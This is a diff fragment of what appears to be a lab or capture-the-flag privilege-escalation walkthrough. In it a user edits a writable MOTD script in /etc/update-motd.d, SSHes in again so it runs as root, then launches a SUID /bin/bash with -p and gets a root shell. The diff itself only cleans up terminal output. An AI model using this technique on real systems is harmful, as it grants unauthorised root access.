@@ -212,14 +212,11 @@ THEN OPENING AN ANOTHER TERMINAL, SSH TO THE JAMES USER
 THEN ON THE PREVIOUS TERMINAL CHECK THE /bin/bash 
 
 fijames@osboxes:/etc/update-motd.d$ nano 00-header
-james@osboxes:/etc/update-motd.d$ ls- la /bin/bash 
-^C
 james@osboxes:/etc/update-motd.d$ ls -la /bin/bash 
 -rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
 james@osboxes:/etc/update-motd.d$ /bin/bash -p
 bash-4.3# id
-uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james
-)
+uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james)
 bash-4.3# whoami
 root
 bash-4.3# 
